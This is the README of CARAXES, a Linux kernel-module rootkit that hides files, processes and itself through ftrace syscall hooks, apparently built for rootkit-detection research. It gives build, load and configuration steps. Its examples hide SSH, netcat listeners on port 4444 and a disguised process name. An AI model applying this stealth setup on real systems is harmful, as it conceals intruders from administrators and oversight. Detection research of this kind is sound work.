# CARAXES - Linux Kernel Module Rootkit

CARAXES - ***C**yber **A**nalytics **R**ootkit for **A**utomated and **X**ploratory **E**valuation **S**cenarios* - is a Linux Kernel Module (LKM) rootkit.
The purpose is to hide processes and files on a system, this can be done via user/group ownership, a magic-string in the filename, or by specific process executable path/command line.

Caraxes was developed for Linux versions 6 and up, and has been tested for 5.14-6.11,
it uses [ftrace-hooking](https://github.com/ilammy/ftrace-hook) at its core.
The rootkit was born to evaluate anomaly detection approaches based on kernel function timings - check out [this repository](https://github.com/ait-aecid/rootkit-detection-ebpf-time-trace) for details.

<p align="center"><img src="https://raw.githubusercontent.com/ait-aecid/caraxes/refs/heads/main/caraxes_logo.svg" width=25% height=25%></p>

<ins>**Important Disclaimer**</ins>: Caraxes is purely for educational and academic purposes. The software is provided "as is" and the authors are not responsible for any damage or mishaps that may occur during its use. Do not attempt to use Caraxes to violate the law. Misuse of the provided software and information may result in criminal charges.

If you use any of the resources provided in this repository, please cite the following publication:
* Landauer, M., Alton, L., Lindorfer, M., Skopik, F., Wurzenberger, M., & Hotwagner, W. (2025). Trace of the Times: Rootkit Detection through Temporal Anomalies in Kernel Activity. Under Review.

## Quick Installation

**Easy Installation (Recommended):**
```bash
git clone https://github.com/ait-aecid/caraxes.git
cd caraxes/
chmod +x install.sh
./install.sh
```

The install script will:
- Detect your Linux distribution
- Install necessary dependencies (kernel headers, build tools)
- Compile the rootkit
- Create a test script
- Provide usage instructions

**Manual Installation:**
```bash
# Install kernel headers (example for Ubuntu/Debian)
sudo apt install linux-headers-$(uname -r) build-essential

# Clone and compile
git clone https://github.com/ait-aecid/caraxes.git
cd caraxes/
make
```

## Features

### File and Directory Hiding
- Hide files/directories containing a magic word (default: "caraxes")
- Hide files/directories owned by specific user ID (default: 1001)
- Hide files/directories owned by specific group ID (default: 21)

### Process Hiding (Enhanced)
- Hide processes by executable path (e.g., `/usr/bin/intelheaders_gnu`)
- Hide processes by command line arguments (e.g., `intelheaders_gnu -i -o`)
- Hide processes by user/group ownership
- Hide processes containing magic word in their name

### Module Stealth
- Optional module hiding from `lsmod` and `/sys/modules`
- Self-protection mechanisms

## Configuration

Edit `rootkit.h` to configure hiding behavior:

```c
// Basic hiding
char* MAGIC_WORD = "caraxes";           // Hide files/processes containing this
int USER_HIDE = 1001;                   // Hide files/processes owned by this user
int GROUP_HIDE = 21;                    // Hide files/processes owned by this group

// Process-specific hiding (NEW)
char* HIDE_PROCESS_EXE = "/usr/bin/intelheaders_gnu";     // Hide by executable path
char* HIDE_PROCESS_CMDLINE = "intelheaders_gnu -i -o";   // Hide by command line
```

## Usage

### Basic Usage
```bash
# Load the rootkit
sudo insmod caraxes.ko

# Test file hiding
ls  # Files with "caraxes" in name should be hidden

# Test process hiding
ps aux | grep <target_process>  # Should not show hidden processes

# Unload the rootkit
sudo rmmod caraxes
```

### Testing with Provided Script
```bash
# Run the automated test
./test_rootkit.sh
```

### Advanced Process Hiding Examples

**Hide specific executable:**
```c
char* HIDE_PROCESS_EXE = "/usr/bin/ssh";
char* HIDE_PROCESS_CMDLINE = NULL;  // Disable cmdline matching
```

**Hide by command line arguments:**
```c
char* HIDE_PROCESS_EXE = NULL;  // Disable exe matching
char* HIDE_PROCESS_CMDLINE = "nc -l -p 4444";  // Hide netcat listeners
```

**Hide multiple criteria (OR condition):**
```c
char* HIDE_PROCESS_EXE = "/usr/bin/intelheaders_gnu";
char* HIDE_PROCESS_CMDLINE = "suspicious_args";  // Hide if either matches
```

## Try it out

To test the rootkit, try to run `ls` in the directory - you should see several files as depicted below. Run `sudo insmod caraxes.ko` to load the rootkit into the kernel. Now, run `ls` again - all files that contain the magic word "caraxes" are hidden from the user. To make the files visible, just remove the rootkit from the kernel using `sudo rmmod caraxes`.

```bash
ubuntu@ubuntu:~/caraxes$ ls
LICENSE         README.md   caraxes.mod    caraxes.o         hooks.h             modules.order
Makefile        caraxes.c   caraxes.mod.c  caraxes_logo.svg  hooks_filldir.h     rootkit.h
Module.symvers  caraxes.ko  caraxes.mod.o  ftrace_helper.h   hooks_getdents64.h  stdlib.h
ubuntu@ubuntu:~/caraxes$ sudo insmod caraxes.ko
ubuntu@ubuntu:~/caraxes$ ls
LICENSE   Module.symvers  ftrace_helper.h  hooks_filldir.h     modules.order  stdlib.h
Makefile  README.md       hooks.h          hooks_getdents64.h  rootkit.h
ubuntu@ubuntu:~/caraxes$ sudo rmmod caraxes
ubuntu@ubuntu:~/caraxes$ ls
LICENSE         README.md   caraxes.mod    caraxes.o         hooks.h             modules.order
Makefile        caraxes.c   caraxes.mod.c  caraxes_logo.svg  hooks_filldir.h     rootkit.h
Module.symvers  caraxes.ko  caraxes.mod.o  ftrace_helper.h   hooks_getdents64.h  stdlib.h
ubuntu@ubuntu:~/caraxes$ make clean
```

## Advanced Configuration

### Module Hiding
Uncomment the `hide_module()` call in `caraxes.c` to hide the module from `lsmod`:

```c
static int rk_init(void) {
    int err;
    
    err = fh_install_hooks(syscall_hooks, ARRAY_SIZE(syscall_hooks));
    if (err){
        return err;
    }

    hide_module();  // Uncomment this line

    return 0;
}
```

**Warning:** If you hide the module, you cannot unload it with `rmmod` anymore. You'll need to implement a signal-based unhiding mechanism.

### Hook Method Selection
Switch between `getdents64` and `filldir` hooking by editing `hooks.h`:

```c
// Current: getdents64 hooking (recommended)
HOOK("sys_getdents64", hook_sys_getdents64, &orig_sys_getdents64),

// Alternative: filldir hooking (comment out getdents64 and uncomment these)
//HOOK_NOSYS("filldir", hook_filldir, &orig_filldir),
//HOOK_NOSYS("filldir64", hook_filldir64, &orig_filldir64),
```

## Supported Distributions

The install script supports:
- **Debian/Ubuntu**: `apt` package manager
- **RHEL/Fedora/CentOS**: `dnf`/`yum` package manager
- **Arch Linux**: `pacman` package manager
- **openSUSE**: `zypper` package manager

For other distributions, install kernel headers and build tools manually.

## Troubleshooting

### Common Issues

**Compilation Errors:**
```bash
# Make sure kernel headers are installed
ls /lib/modules/$(uname -r)/build

# Clean and rebuild
make clean
make
```

**Module Loading Errors:**
```bash
# Check kernel logs
dmesg | tail

# Verify module signature (if required)
modinfo caraxes.ko
```

**Cannot Unload Module:**
If you enabled `hide_module()`, the module cannot be unloaded with `rmmod`. You'll need to:
1. Implement a signal-based unhiding mechanism
2. Reboot the system
3. Use advanced kernel debugging tools

### Debug Mode
Uncomment debug lines in the code for troubleshooting:
```c
//rk_info("module loaded\n");     // Uncomment for debug output
//printk(KERN_DEBUG "debug info"); // Add custom debug messages
```

Monitor with: `sudo dmesg -w`

## Documentation

- **PROCESS_HIDING_GUIDE.md**: Detailed guide for process hiding features
- **install.sh**: Automated installation script
- **test_rootkit.sh**: Automated testing script (created by install.sh)

## Missing Features: Open Ports

`/proc/net/{tcp,udp}` list open ports in a single file instead of one by port.
This can be addressed either by mangling with the `read*` syscalls or `tcp4_seq_show()`, which fills the content of this file.
Additionally, `/sys/class/net` shows statistics of network activity, which could hint to an open port.
Also `getsockopt` would fail when trying to bind to an open port - we would kind of have to flee, give up our port,
and start using a different one.

## Credits
- **sw1tchbl4d3/generic-linux-rootkit**: forked from https://codeberg.org/sw1tchbl4d3/generic-linux-rootkit
- **Diamorphine**: `linux_dirent` element removal code from [Diamorphine](https://github.com/m0nad/Diamorphine)
- `ftrace_helper.h`: https://github.com/ilammy/ftrace-hook, edited to fit as a library instead of a standalone rootkit.
- https://xcellerator.github.io/posts/linux_rootkits_01/, got me into rootkits and helped me gain most of the knowledge to make this. Much of the code is inspired by the code found here.

## License

This project is licensed under the GPL License - see the LICENSE file for details.

## Ethical Use

This software is intended for:
- **Educational purposes**: Learning about kernel programming and security
- **Security research**: Testing detection mechanisms
- **Authorized penetration testing**: Only on systems you own or have explicit permission to test

**DO NOT USE** for:
- Unauthorized access to systems
- Malicious activities
- Violating laws or regulations

The authors are not responsible for misuse of this software.
